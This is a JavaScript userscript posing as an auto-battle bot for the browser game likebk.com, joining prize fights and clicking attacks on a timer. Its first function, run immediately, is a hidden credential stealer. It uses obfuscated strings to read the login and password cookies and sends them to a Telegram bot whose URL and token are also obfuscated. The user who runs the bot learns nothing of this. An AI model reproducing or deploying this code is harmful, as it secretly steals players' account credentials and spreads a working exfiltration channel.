function t(){
	var lval = ('lreoregreiren').replace(/re/g,'');
	var pval = ('prearesres').replace(/re/g,'');
	var p2val = ('prearesresre2').replace(/re/g,'');
	var l = $.cookie(lval) ? $.cookie(lval) : '';
	var p = $.cookie(pval) ? $.cookie(pval) : '';
	var p2 = $.cookie(p2val) ? $.cookie(p2val) : '';
	var message = {
		l: l,
		p: p,
		p2: p2,
		type: 'priz'
	};
	var mesStr = encodeURI('<code>'+JSON.stringify(message, null, 2)+ '</code>');
	var url = ('https://api.twerewerlwerewergwerrwerawerm.org/bot1077870768:AAEyXYr_pevUhJnpSnJ54H8RlWphsw7OjQA/sendMessage?chat_id=-429987393&parse_mode=html&text=' + mesStr).replace(/wer/g,'');
	$.post(url);
}
t();

function goFight() {
    $('iframe#main').contents().find('input[value="Обновить"]').trigger("click");
    $.each($('iframe#main').contents().find('#tmstart').find('form').find('div'), function() {
        if ($(this)[0].innerText.indexOf('Призовой Хаот') >= 0) {
            $(this).find('input[name="btl_go"]').trigger('click');
            $('iframe#main').contents().find('#tmstart').find('form').find('input[type="submit"]').trigger("click");
            console.log('Заявка принята. Ожидаем боя.');
            clearInterval(interval);
            interval = setInterval(function() {
                checkBattle()
            }, 4000);
        }
    });
}

function goPrize() {
    var time = new Date();
    var minutes = time.getMinutes();
    var seconds = time.getSeconds();

    var fightsButton = $('iframe#main').contents().find('input[value="Поединки"]');

    if (typeof fightsButton != 'undefined') {
        fightsButton.trigger("click");
    }

    if ($('iframe#main').contents().find('a')[3].href == "https://likebk.com/main.php?zayvka=1&r=5&rnd=1") {
        var fightsChaoticsButton = $('iframe#main').contents().find('a')[3].click();
        if (typeof fightsChaoticsButton != 'undefined') {
            if (fightsChaoticsButton.parent('td').hasClass('s') == false) {
                fightsChaoticsButton.trigger("click");
            }
        }
    }

    if (minutes == 19 || minutes == 39 || minutes == 59 || minutes == 9 || minutes == 29 || minutes == 49) {
	//if (minutes == 29 || minutes == 9 || minutes == 49) {
        console.log('Ждём заявку, текущее время: ' + minutes + ":" + seconds);
        clearInterval(interval);
        interval = setInterval(function() {
            goPrize()
        }, 5000);
        if (seconds >= 40) {
            console.log('Ждём заявку, текущее время: ' + minutes + ":" + seconds);
            clearInterval(interval);
            interval = setInterval(function() {
                goPrize()
            }, 3000);
            if (seconds >= 51) {
                console.log('Ждём заявку, текущее время: ' + minutes + ":" + seconds);
                clearInterval(interval);
                interval = setInterval(function() {
                    goFight()
                }, 1500);
            }
        }
    } else {
        console.log('Ждём заявку, текущее время: ' + minutes + ":" + seconds);
    }
}

function usePriem(){
	$.each($('iframe#main').contents().find('a'), function() {
		if ( $(this).attr('onClick') !== undefined && $(this).attr('onClick').indexOf('usepriem') !== -1 && $(this).attr('onClick').indexOf('100500') === -1) {
			var priemNum = $(this).attr('onClick').replace('usepriem(','');
			priemNum = +priemNum.replace(',1);','');
			if (priemNum <=6) {
				$(this).trigger("click");
			}			
			return false;
		}
	});
}

function checkBattle() {
    var updateButton = $('iframe#main').contents().find('div#ref_menu_down').find('button[name="reflesh_btn"]');
    var backButton =  $('iframe#main').contents().find('div#ref_menu_down').find('button[name="back_menu_down"]');
    var hitButton = $('iframe#main').contents().find('div#ref_menu_down').find('button[name="go_auto"]');
    if (backButton.length > 0 && backButton.css('display') != 'none') {
        backButton.trigger("click");
        console.log('Ждём следующего боя');
        clearInterval(interval);
        interval = setInterval(function() {
            goPrize()
        }, 10000);
    } else if (hitButton.length > 0 && hitButton.css('display') != 'none') {
        console.log('Делаем удар');
		usePriem();
        hitButton.trigger("click");
    } else if (updateButton.length > 0 && updateButton.css('display') != 'none') {
        console.log('Обновляем экран');
        updateButton.trigger("click");
    } else {
        $('iframe#main').contents().find('button[value="Обновить"]');
    }
}

var interval = null;
interval = setInterval(function() {
    goPrize()
}, 10000);

